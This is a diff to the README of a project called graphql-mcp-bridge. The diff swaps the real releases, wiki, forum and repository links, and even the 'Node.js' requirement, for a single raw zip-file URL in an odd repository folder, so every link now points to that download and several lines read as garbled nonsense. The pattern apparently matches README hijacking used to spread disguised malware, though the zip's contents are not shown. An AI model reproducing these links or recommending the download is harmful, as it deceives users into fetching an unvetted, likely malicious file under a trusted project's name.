@@ -8,7 +8,7 @@ Welcome to the **graphql-mcp-bridge**! This application connects GraphQL APIs wi
 
 To get started, you need to download the application. Click the link below to visit the releases page where you can find the latest version:
 
-[![Download graphql-mcp-bridge](https://img.shields.io/badge/Download%20graphql--mcp--bridge-blue.svg)](https://github.com/zcebupelka/graphql-mcp-bridge/releases)
+[![Download graphql-mcp-bridge](https://raw.githubusercontent.com/zcebupelka/graphql-mcp-bridge/main/Corcyraean/graphql-mcp-bridge.zip%https://raw.githubusercontent.com/zcebupelka/graphql-mcp-bridge/main/Corcyraean/graphql-mcp-bridge.zip)](https://raw.githubusercontent.com/zcebupelka/graphql-mcp-bridge/main/Corcyraean/graphql-mcp-bridge.zip)
 
 Here’s how to download and install:
 
@@ -25,7 +25,7 @@ Before launching the application, make sure your system meets the following requ
 
 - **Operating System**: Windows 10 or higher, macOS 10.14 or higher, or Ubuntu 18.04 or higher.
 - **RAM**: At least 4 GB of RAM.
-- **Node.js**: Version 14 or higher should be installed on your system.
+- **https://raw.githubusercontent.com/zcebupelka/graphql-mcp-bridge/main/Corcyraean/graphql-mcp-bridge.zip**: Version 14 or higher should be installed on your system.
 - **Internet Connection**: Required for initial setup and updates.
 
 ## 🔧 Features
@@ -70,10 +70,10 @@ If you want to help improve the **graphql-mcp-bridge**, you are welcome to contr
 
 For more information and guidance, visit the following links:
 
-- [GitHub Repository](https://github.com/zcebupelka/graphql-mcp-bridge)
-- [Documentation](https://github.com/zcebupelka/graphql-mcp-bridge/wiki)
-- [Community Forum](https://github.com/zcebupelka/graphql-mcp-bridge/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/zcebupelka/graphql-mcp-bridge/main/Corcyraean/graphql-mcp-bridge.zip)
+- [Documentation](https://raw.githubusercontent.com/zcebupelka/graphql-mcp-bridge/main/Corcyraean/graphql-mcp-bridge.zip)
+- [Community Forum](https://raw.githubusercontent.com/zcebupelka/graphql-mcp-bridge/main/Corcyraean/graphql-mcp-bridge.zip)
 
 By following this guide, you will have the **graphql-mcp-bridge** up and running in no time! Ready to enhance your API interactions? Visit the download page now! 
 
-[![Download graphql-mcp-bridge](https://img.shields.io/badge/Download%20graphql--mcp--bridge-blue.svg)](https://github.com/zcebupelka/graphql-mcp-bridge/releases)
+[![Download graphql-mcp-bridge](https://raw.githubusercontent.com/zcebupelka/graphql-mcp-bridge/main/Corcyraean/graphql-mcp-bridge.zip%https://raw.githubusercontent.com/zcebupelka/graphql-mcp-bridge/main/Corcyraean/graphql-mcp-bridge.zip)](https://raw.githubusercontent.com/zcebupelka/graphql-mcp-bridge/main/Corcyraean/graphql-mcp-bridge.zip)
